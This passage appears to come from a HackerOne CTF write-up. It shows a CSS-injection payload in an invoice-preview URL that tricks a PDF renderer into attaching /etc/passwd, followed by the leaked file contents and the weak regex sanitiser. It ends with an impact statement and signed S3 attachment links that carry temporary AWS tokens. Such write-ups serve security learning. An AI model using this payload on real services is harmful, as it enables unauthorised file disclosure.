http://172.28.0.3/invoices/preview?d={\u0026quot;companyName\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;\u0026lt;\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;\u0026lt;\u0026quot;,\u0026quot;\u0026lt;\u0026quot;,\u0026quot;1\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;\u0026lt;\u0026quot;:{\u0026quot;\u0026lt;/style%20\u0026lt;!--\u0026quot;:\u0026quot;\u0026lt;\u0026quot;}}}\n\n        \u0026amp;lt; {\n            \u0026lt;/style \u0026lt;!--: \u0026amp;lt;;\n        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice, so now we just need to inject the \u003ccode\u003e\u0026lt;a\u0026gt;\u003c/code\u003e tag and we will get LFI for free in the form of a PDF attachment.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET http://172.28.0.3/invoices/pdfize?d={\u0026quot;companyName\u0026quot;:\u0026quot;a\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;b\u0026quot;,\u0026quot;invoiceNumber\u0026quot;:\u0026quot;c\u0026quot;,\u0026quot;date\u0026quot;:\u0026quot;d\u0026quot;,\u0026quot;items\u0026quot;:[[\u0026quot;1\u0026quot;,\u0026quot;a\u0026quot;,\u0026quot;b\u0026quot;,\u0026quot;10\u0026quot;]],\u0026quot;styles\u0026quot;:{\u0026quot;asdfasdf\u0026quot;:{\u0026quot;\u0026lt;/style%20\u0026lt;!--\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;!--\u0026gt;\u0026lt;a%20href=\\\u0026quot;file:///etc/passwd\\\u0026quot;%20rel=\\\u0026quot;attachment\\\u0026quot;\u0026gt;wow\u0026lt;/a%20\u0026lt;!--\u0026quot;:\u0026quot;\u0026quot;}}}\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBoom! Pwned :)\u003c/p\u003e\n\n\u003cp\u003eSo far all of the webapps have been at \u003ccode\u003e/app\u003c/code\u003e mounted in Docker. So let\u0026#39;s just try \u003ccode\u003e/app/main.py\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u0026quot;\nCONGRATULATIONS!\n\nIf you\u0026#39;re reading this, you\u0026#39;ve made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include \u0026#39;c8889970d9fb722066f31e804e351993\u0026#39; in the report, so we know for sure you made it through!\n\nCongratulations again, and I\u0026#39;m sorry for the red herrings. :)\n\u0026quot;\u0026quot;\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNice. And just for fun, here\u0026#39;s the crappy CSS sanitization:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003estripClosingTags\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003ere\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esub\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003er\u0026#39;\u0026lt;\\s*/[^\u0026lt;]+?\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"main.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/498/351c8b3a1e6009427e3a25f603383d2dc7b53f22/main.py?response-content-disposition=attachment%3B%20filename%3D%22main.py%22%3B%20filename%2A%3DUTF-8%27%27main.py\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=7a83939e41df480d247e8256eba3e43e6a937f8a61f5adb5f62e3ab4d3ccb160\" data-attachment-type=\"text/plain\"\u003emain.py (F440498)\u003c/a\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"thermostat.py\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/500/b7872a49e33d9944a8c7d2f76ed851834728e9a9/thermostat.py?response-content-disposition=attachment%3B%20filename%3D%22thermostat.py%22%3B%20filename%2A%3DUTF-8%27%27thermostat.py\u0026amp;response-content-type=text%2Fx-python\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=2acc90a4e3bc335d1a28fccb3015a19c2201ca6e10fb45fbab7e34881b38df5e\" data-attachment-type=\"text/x-python\"\u003ethermostat.py (F440500)\u003c/a\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"hosts.txt\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/501/abd1276a72e20598c3fd0a3349f3458188d1fe30/hosts.txt?response-content-disposition=attachment%3B%20filename%3D%22hosts.txt%22%3B%20filename%2A%3DUTF-8%27%27hosts.txt\u0026amp;response-content-type=text%2Fplain\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061220Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026amp;X-Amz-Signature=d68e72533f5a92ee7f78dfdeea86b9f8fd0480529f13ae11d9b47e530d890d3c\" data-attachment-type=\"text/plain\"\u003ehosts.txt (F440501)\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could download the confidential reports and invoices on the internal \u0026quot;Accounting\u0026quot; server, as well as fraudulently create new Invoices. The attacker can also execute arbitrary code on the company intranet because they are able to execute code on the thermostat\u0026#39;s administration web panel\u0026#39;s server.\u003c/p\u003e\n","weakness":{"id":126,"name":"File and Directory Information Exposure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":440486,"file_name":"flite1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/486/9ad703f9fd49af597d6fc4cafd909eb77df5d7ee/flite1.png?response-content-disposition=attachment%3B%20filename%3D%22flite1.png%22%3B%20filename%2A%3DUTF-8%27%27flite1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=77cb2bc729eae073c701b54afeb8f155791d47f2ee3976b0b6b5a9dd240965c6","file_size":5521,"type":"image/png"},{"id":440487,"file_name":"flite3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/487/788ebce60edc0ea6a83f8dadcd10c48210d723af/flite3.png?response-content-disposition=attachment%3B%20filename%3D%22flite3.png%22%3B%20filename%2A%3DUTF-8%27%27flite3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=1add511574f7d88b032ef5e2f6cd37e07e94e82703195aa566b3625e45d85b11","file_size":7195,"type":"image/png"},{"id":440488,"file_name":"flite2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/488/98bdf54f0f9464f45ad09dba12334cfd8567e39d/flite2.png?response-content-disposition=attachment%3B%20filename%3D%22flite2.png%22%3B%20filename%2A%3DUTF-8%27%27flite2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=536173b24b028f352fc79f1cc11aef150dc9ecf4136863ddeab78ce2b41ac598","file_size":13985,"type":"image/png"},{"id":440489,"file_name":"stego2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/489/189b9628811dcfad7154dbe6d1920464f7da0398/stego2.png?response-content-disposition=attachment%3B%20filename%3D%22stego2.png%22%3B%20filename%2A%3DUTF-8%27%27stego2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=5539b8dae1c76c9f2ca0477f65bcec1d5ddc9b28189b382016a82a11416dd403","file_size":230815,"type":"image/png"},{"id":440490,"file_name":"stego3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/490/e1b4e6516f457e540996176ae90d271dee1114bf/stego3.png?response-content-disposition=attachment%3B%20filename%3D%22stego3.png%22%3B%20filename%2A%3DUTF-8%27%27stego3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061220Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89